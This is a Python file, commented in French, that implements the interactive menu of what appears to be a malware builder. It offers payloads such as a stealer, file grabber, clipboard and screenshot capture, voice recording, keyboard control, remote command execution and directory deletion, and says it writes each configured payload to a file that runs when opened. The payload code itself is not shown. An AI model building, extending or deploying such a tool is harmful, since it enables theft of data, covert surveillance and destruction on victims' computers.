from colorama import Fore, Style
import os 
from Option.modules.payload.clipboard import *
from Option.modules.payload.screenshot import *
from Option.modules.payload.dirlist import *
from Option.modules.payload.filegrab import *
from Option.modules.payload.keybcontrol import *
from Option.modules.payload.openurl import *
from Option.modules.payload.rmdir import *
from Option.modules.payload.rmscript import *
from Option.modules.payload.runcmd import *
from Option.modules.payload.shutdown import *
from Option.modules.payload.steal import *
from Option.modules.payload.restartpc import *
from Option.modules.payload.voicerec import *
from Option.modules.payload.wallpaper import *
from Option.modules.payload.search_interceptor import *
#from Option.modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
from Option.modules.network.porthammer import *
from Option.modules.network.networkinfo import *

def console():
    def clear():
        os.system('cls')

    input(f"""{Fore.CYAN}Cette console interactive vous permet de configurer et d'exécuter divers modules payload, capture et scan.
          
Vous allez configurer les modules souhaités étape par étape.
A la fin de chaque configuration, le module sera créer dans un fichier prêt à être exécuté dès l'ouverture.

          {Fore.YELLOW}Vous pouvez taper 'back' à tout moment pour revenir au menu précédent.

          Vous pouvez taper 'exit' ou 'quit' pour quitter la console interactive.

          Vous pouvez taper 'help' pour afficher de l'aide à tout moment.{Style.RESET_ALL}

Appuyez sur Entrée pour continuer...
          """)
    
    def show_help():
        clear()
        print(f"""{Fore.CYAN}=== Aide Console Interactive ==={Style.RESET_ALL}
{Fore.YELLOW}Commandes disponibles :{Style.RESET_ALL}
- payload : Accéder aux modules payload.
- network : Accéder aux modules réseau.
- scan : Accéder aux modules de scan.
- back : Revenir au menu précédent.
- exit / quit : Quitter la console interactive.
- help : Afficher cette aide.
        """)
        input("Appuyez sur Entrée pour revenir à la console...")
    clear()

    payloads = [
        ("Clipboard", clipboard_module),
        ("Screenshot", screenshot_module),
        ("Directory listing", directory_listing_module),
        ("File Grabber", filegrab),
        ("Keyboard controller", keybcontrol),
        ("Open url", open_url_module),
        ("Restart PC", restart_module),
        ("Remove Directory", rmdir_module),
        ("Remove file", rmscript),
        ("Run Command on terminal", runcmd_module),
        ("Shutdown", shutdown_module),
        ("Stealer", steal_module),
        ("Voice record", voicerec),
        ("Change wallpaper", wallpaper),
        ("Search interceptor"),
    ]

    captures = [
        ("Network info", networkinfo),
        ("Port Hammer", scan_module),
    ]

    scanners = [
        "Vulnerability Scanner",
    ]

    print(Fore.CYAN + "\n=== Console Interactive ===\n")
    print(Fore.YELLOW + "Entrez 'payload' ou 'network' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
    while True:
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
        if cmd.lower() == "help":
            show_help()
            clear()
            print(Fore.CYAN + "\n=== Console Interactive ===\n")
            print(Fore.YELLOW + "Entrez 'payload' ou 'network' ou 'scan' pour accéder aux modules correspondants.")
            continue
        elif cmd.lower() == "payload":
            clear()
            print(f"""{Fore.CYAN}=== Modules Payload ==={Style.RESET_ALL}

    {Fore.YELLOW}Liste des payloads disponibles :{Style.RESET_ALL}

        1. Clipboard
        2. Screenshot
        3. Directory listing
        4. File Grabber
        5. Keyboard controller
        6. Open url
        7. Restart PC
        8. Remove Directory
        9. Remove file
        10. Run Command on terminal
        11. Shutdown
        12. Stealer
        13. Voice record
        14. Change wallpaper
        15. Search interceptor

    """)
            payload_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if payload_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'network' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                payload_index = int(payload_choix) - 1
                if 0 <= payload_index < len(payloads):
                    payload_name, payload_func = payloads[payload_index]
                    print(Fore.YELLOW + f"Configuration du payload : {payload_name}" + Style.RESET_ALL)
                    if payload_func:
                        payload_func()  # Appeler le module
                    else:
                        print(Fore.RED + "Module non encore implémenté." + Style. RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de payload invalide." + Style.RESET_ALL)
            except ValueError: 
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)

        elif cmd.lower() == "network":
            clear()
            print(Fore.CYAN + "=== Modules Network ===" + Style.RESET_ALL)
            print(Fore.YELLOW + "Liste des modules réseau disponibles :" + Style.RESET_ALL)
            print("""
                  
        1. Network info
        2. Port Hammer

                  
                  """)
            capture_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if capture_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'network' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                capture_index = int(capture_choix) - 1
                if 0 <= capture_index < len(captures):
                    print(Fore.YELLOW + f"Configuration de la capture : {captures[capture_index]}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de capture invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)
        
        elif cmd.lower() == "scan":
            clear()
            print(Fore.CYAN + "=== Modules Scan ===" + Style.RESET_ALL)
            print(Fore.YELLOW + "Liste des scanners disponibles :" + Style.RESET_ALL)
            print("""
    1. Vulnerability Scanner (en développement)
                  """)
            scan_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if scan_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'network' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                scan_index = int(scan_choix) - 1
                if 0 <= scan_index < len(scanners):
                    print(Fore.YELLOW + f"Configuration du scanner : {scanners[scan_index]}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de scanner invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)

        elif cmd.lower() in ["exit", "quit"]:
            print(Fore.CYAN + "Fermeture de la console interactive." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)

